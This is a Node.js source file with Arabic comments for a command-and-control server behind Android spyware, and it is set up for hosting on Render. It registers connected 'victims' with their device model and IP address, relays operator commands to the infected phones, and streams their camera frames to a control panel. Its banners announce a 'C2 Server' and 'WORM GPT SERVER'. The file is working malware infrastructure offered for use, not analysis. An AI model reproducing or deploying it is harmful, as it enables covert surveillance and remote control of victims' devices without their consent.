const express = require('express');
const app = express();
const http = require('http').createServer(app);
const io = require('socket.io')(http, {
    cors: {
        origin: "*", // للسماح بلوحة التحكم بالاتصال من أي مكان
        methods: ["GET", "POST"]
    },
    maxHttpBufferSize: 1e8 // مهم جداً لاستقبال بث الفيديو والصور العالية الدقة
});

// ملفات لوحة التحكم (اختياري إذا أردت رفعها مع السيرفر)
app.use(express.static('public'));

// 1. استجابة ضرورية لمنصة Render (Health Check)
app.get('/', (req, res) => {
    res.status(200).send('C2 Server is Online and Secure 😈');
});

// تخزين الضحايا النشطين
let victims = {};

io.on('connection', (socket) => {
    console.log('[!] اتصال جديد عبر النفق المشفر');

    // استقبال بيانات الضحية عند الربط الأول
    socket.on('victim_online', (data) => {
        victims[socket.id] = {
            id: socket.id,
            model: data.model || "Unknown Android",
            ip: socket.handshake.address
        };
        console.log(`[+] تم إحكام السيطرة على: ${victims[socket.id].model}`);
        io.emit('new_victim_alert', victims[socket.id]);
    });

    // تمرير الأوامر من لوحة التحكم (Admin) إلى الضحية (Target)
    socket.on('admin_command', (payload) => {
        console.log(`[→] تنفيذ أمر: ${payload.command}`);
        socket.broadcast.emit(payload.command, payload);
    });

    // استقبال ونقل بث الكاميرا (Video Frames)
    socket.on('video_frame', (base64Data) => {
        // نرسل البيانات فوراً للوحة التحكم
        socket.broadcast.emit('display_frame', { frame: base64Data });
    });

    socket.on('disconnect', () => {
        if (victims[socket.id]) {
            console.log(`[-] الضحية ${victims[socket.id].model} خرجت عن السيطرة`);
            delete victims[socket.id];
        }
    });
});

// 2. تعديل المنفذ (Port) ليتناسب مع Render
// Render يمرر المنفذ عبر متغير البيئة process.env.PORT
const PORT = process.env.PORT || 8080;
http.listen(PORT, '0.0.0.0', () => {
    console.log(`-------------------------------------------`);
    console.log(`WORM GPT SERVER IS LIVE ON PORT: ${PORT}`);
    console.log(`GLOBAL ACCESS ENABLED 😈`);
    console.log(`-------------------------------------------`);
});
